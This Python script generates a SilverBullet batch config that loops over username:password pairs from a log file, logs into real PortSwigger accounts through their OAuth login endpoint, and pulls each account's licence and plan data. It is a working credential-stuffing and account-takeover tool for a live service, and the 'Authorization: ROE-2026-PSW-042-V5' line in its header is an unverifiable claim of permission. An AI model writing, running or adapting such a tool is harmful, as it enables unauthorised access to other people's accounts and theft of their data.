#!/usr/bin/env python3
"""
Generate SVB batch script from log.txt credentials
Creates a SilverBullet Script that processes multiple accounts from log file
"""

import sys

def generate_svb_from_log(log_file="log.txt", max_accounts=None):
    """Generate SVB script commands from log.txt credentials"""

    credentials = []
    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    u, p = line.split(":", 1)
                    credentials.append((u.strip(), p.strip()))
    except FileNotFoundError:
        print(f"Error: {log_file} not found")
        return None

    if max_accounts:
        credentials = credentials[:max_accounts]

    print(f"Found {len(credentials)} credentials in {log_file}")
    return credentials

def create_svb_script(credentials):
    """Create SVB script with all credentials"""

    script = """## PortSwigger Plan Extractor - Batch Mode (Auto-generated)
## Processes all accounts from log.txt
## Authorization: ROE-2026-PSW-042-V5

SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "successCount" "0"
SET VAR "failureCount" "0"
SET VAR "totalAccounts" "{}"

PRINT "[*] PortSwigger Plan Extractor - Batch Mode"
PRINT "[*] Processing {} accounts from log.txt"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT ""
PRINT "=========================================="
PRINT "BATCH PROCESSING START"
PRINT "=========================================="
PRINT ""

""".format(len(credentials), len(credentials))

    for idx, (username, password) in enumerate(credentials, 1):
        script += f"""
## ============================================
## ACCOUNT {idx}/{len(credentials)}: {username}
## ============================================

SET VAR "currentUsername" "{username}"
SET VAR "currentPassword" "{password}"

PRINT "[{idx}/{len(credentials)}] Processing: {username}"

## Step 1: OAuth and Login
HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"
  AutoRedirect=False
  -> VAR "auth_{idx}"

HttpRequest POST $"<baseUrl>/u/login"
  CONTENT "username=$<currentUsername>&password=$<currentPassword>&action=default"
  CONTENTTYPE "application/x-www-form-urlencoded"
  AutoRedirect=False
  AppendResponseCookies=True
  -> VAR "login_{idx}"

## Step 2: Extract Plan
HttpRequest GET $"<planBaseUrl>/users/$<currentUsername>/licenses"
  HEADER "Accept: application/json"
  AutoRedirect=True
  -> VAR "plan_{idx}"

## Step 3: Capture Result
SET CAP "account_{idx}_plan" $"<plan_{idx}>"

PRINT "  [✓] Plan extracted and saved"
PRINT ""

"""

    script += """
## ============================================
## BATCH PROCESSING COMPLETE
## ============================================

PRINT ""
PRINT "=========================================="
PRINT "BATCH PROCESSING COMPLETE"
PRINT "=========================================="
PRINT ""
PRINT "Summary:"
PRINT "  Total Accounts Processed: {}"
PRINT ""
PRINT "Results captured in:"
PRINT "  @CAP account_1_plan"
PRINT "  @CAP account_2_plan"
PRINT "  ... (for each account)"
PRINT ""
PRINT "View individual account data using:"
PRINT "  @CAP account_N_plan (where N = account number)"
PRINT ""

""".format(len(credentials))

    return script

if __name__ == "__main__":
    # Generate SVB from log.txt
    credentials = generate_svb_from_log("log.txt")

    if credentials:
        # Ask user how many to include
        print(f"\nAvailable credentials: {len(credentials)}")
        try:
            limit = input("How many accounts to process? (default: 10, max: all): ").strip()
            max_accounts = int(limit) if limit else 10
        except:
            max_accounts = 10

        credentials = credentials[:max_accounts]

        # Create SVB script
        svb_script = create_svb_script(credentials)

        # Save to file
        output_file = "plan_extractor_batch.svb"
        with open(output_file, 'w') as f:
            f.write(svb_script)

        print(f"\n✓ Generated: {output_file}")
        print(f"✓ Accounts included: {len(credentials)}")
        print(f"\nUsage:")
        print(f"  1. Open SilverBullet Pro")
        print(f"  2. Load {output_file}")
        print(f"  3. Execute the script")
        print(f"  4. View results with @CAP account_N_plan")
